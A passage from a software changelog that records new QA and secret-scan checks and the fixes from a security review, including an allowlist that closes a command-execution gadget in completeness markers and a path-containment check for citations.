- `docs/qa/recurring-findings-registry.md` + `src/qa/recurring-findings-registry.ts` (QA-13): lighter registry-file mechanism, human-ratified — a documented convention plus a structural validator, not an automated classifier (that's `docs/backlog.md`).
- `src/qa/reference-resolver.ts` (QA-14): fails on a citation to a nonexistent authority, a cross-repo Issue number, or an unparseable citation shape. Never silently skips an unrecognized citation shape.
- `src/qa/completeness-claim-checker.ts` (QA-15): fails when a numeric completeness claim's cited instrument, re-run, produces a different number than claimed, or when no machine-readable instrument reference exists.
- `src/qa/broken-instrument-gate.ts` (QA-16) + `docs/qa/broken-instruments.json`: fails unless a dated, named `docs/decisions.md` entry explicitly disables a registered broken instrument; a malformed or missing disable-decision still fails.
- `src/secret-scan/history-scan.ts` (OSS-01): scans full git history (every commit, not just the working tree), redacts secret values before logging. Proven to catch a fake secret planted in a non-HEAD commit. `docs/qa/secret-scan-allowlist.json` — the `.gitleaksignore`-equivalent CLAUDE.md's sensitive-areas list names — allowlists this repo's own test fixtures by exact path+pattern-id; an allowlisted match is still reported, never silently dropped, and still fails the gate if a non-allowlisted match exists alongside it.

### Fixed — Stage 3 review fix-now pass (S1, `app-security-reviewer` REWORK + `cross-domain-reviewer` APPROVE-WITH-CONDITIONS, 2026-08-30)
- **[HIGH, GH issue 57]** `src/qa/completeness-claim-checker.ts` (QA-15): `[[completeness: cmd="..." expect=N]]` markers parsed out of `docs/STATE.md`/`docs/decisions.md`/`CHANGELOG.md` prose were `execFile`d directly — a demonstrated arbitrary-command-execution gadget wired unconditionally into CI. `cmd=` is now a symbolic name resolved only against a fixed, code-owned `KNOWN_INSTRUMENTS` allowlist (`src/qa/completeness-claim-checker.ts`); a name not on the allowlist fails closed, never executes. Regression tests prove a crafted malicious marker (and a shell-metacharacter-laden one) is rejected, with the runner never invoked.
- **[MED, GH issue 18 reopened/recurred]** `src/qa/diff-fixture-check.ts` (QA-02) and `src/qa/reference-resolver.ts` (QA-14) silently reported `VACUOUS-PASS`/exit 0 on a zero-SHA base ref (GitHub's `github.event.before` sentinel on a branch's first push or a history-discontinuous push). New `resolveChangedFiles`/`isZeroSha` in `src/lib/git.ts` detect the sentinel explicitly and fall back to a full-tree scan (every tracked file, via `lsTree`) instead of silently skipping the check — chosen over failing loud because it keeps QA-02/QA-14 actually enforcing instead of blocking CI on an infra artifact. Regression test added per instrument, plus one at the shared `resolveChangedFiles` level. Logged in `docs/qa/recurring-findings-registry.md` (second occurrence of this class).
- **[LOW]** `.github/workflows/ci.yml`: `actions/checkout`, `actions/setup-node`, `actions/upload-artifact` pinned from floating `@v4` tags to their current release's commit SHA (with a version comment).
- **[LOW, SUSPICION]** `src/qa/reference-resolver.ts` (QA-14): a PR-authored backtick citation path was resolved against `repoRoot` with no containment check, letting a crafted `../../`-style citation probe file existence/line-count outside the repo. New `resolveWithinRepo` rejects any resolved path that escapes `repoRoot` before `pathExists`/`lineCount` touch it; regression test confirms rejection.

### Fixed — real bugs found during S1's own build and dogfooding, each with a regression test
- `src/lib/exec.ts`: a nested `node --test` subprocess (QA-06's mutation harness reruns a suite as a subprocess) silently reported 0 tests / exit 0 because `NODE_TEST_CONTEXT` leaked into the child process env from the outer test runner. Every mutant would have scored SURVIVED, silently.
- `src/lib/git.ts`: `git ls-tree` submodule (gitlink) entries were treated as scannable blobs, crashing `history-scan.ts` on this repo's own `adr` submodule.
- `src/secret-scan/patterns.ts`: the email-address pattern false-positived on npm package version specifiers (`@microsoft/agent-governance-sdk@5.0.0`) in `REQUIREMENTS.md`; tightened to require an alphabetic TLD.
- `src/qa/reference-resolver.ts` (QA-14) and `src/secret-scan/history-scan.ts`/`patterns.ts` (OSS-01), run against their own source and history, each flagged their own doc-comment placeholders and test fixtures at first. Fixed by rewording the doc comments (not a real citation/secret, just example text) and by the allowlist mechanism above (real, checker's-own test fixtures) — not by suppressing the checks.
